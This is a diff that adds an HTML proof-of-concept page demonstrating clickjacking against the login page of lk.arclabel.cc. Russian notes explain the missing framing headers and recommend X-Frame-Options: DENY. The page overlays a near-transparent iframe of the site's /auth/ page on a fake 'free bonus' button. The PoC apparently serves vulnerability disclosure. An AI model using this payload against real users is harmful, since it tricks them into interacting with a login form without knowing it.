@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking PoC — lk.arclabel.cc</title>
+    <style>
+        body { font-family: sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }
+        h1 { color: #e94560; }
+        .container { position: relative; width: 1000px; height: 700px; border: 2px solid #e94560; margin-top: 20px; }
+        .container iframe {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%;
+            opacity: 0.15; z-index: 2;
+            border: none;
+        }
+        .fake-btn {
+            position: absolute; top: 280px; left: 350px; z-index: 1;
+            background: #e94560; color: white; border: none; padding: 20px 40px;
+            font-size: 22px; border-radius: 8px; cursor: pointer;
+        }
+        .info { margin-top: 20px; padding: 15px; background: #16213e; border-radius: 8px; max-width: 1000px; }
+        code { background: #0f3460; padding: 2px 6px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <h1>Clickjacking PoC — arclabel.cc</h1>
+    <p>
+        Сайт <code>lk.arclabel.cc</code> не имеет заголовков <code>X-Frame-Options</code>
+        и <code>Content-Security-Policy: frame-ancestors</code>, что позволяет
+        встраивать его в iframe на вредоносном сайте.
+    </p>
+
+    <div class="container">
+        <iframe src="https://lk.arclabel.cc/auth/"></iframe>
+        <button class="fake-btn">ПОЛУЧИ БЕСПЛАТНЫЙ БОНУС!</button>
+    </div>
+
+    <div class="info">
+        <p><strong>Как это работает:</strong></p>
+        <ul>
+            <li>Страница авторизации загружена в прозрачном iframe (opacity: 0.15)</li>
+            <li>Поверх неё — фейковая кнопка с привлекательным текстом</li>
+            <li>Пользователь нажимает на кнопку, но на самом деле взаимодействует с формой логина</li>
+            <li>В реальной атаке opacity будет 0 (полностью невидимый iframe)</li>
+        </ul>
+        <p><strong>Исправление:</strong> Добавить <code>X-Frame-Options: DENY</code> в Nginx.</p>
+    </div>
+</body>
+</html>
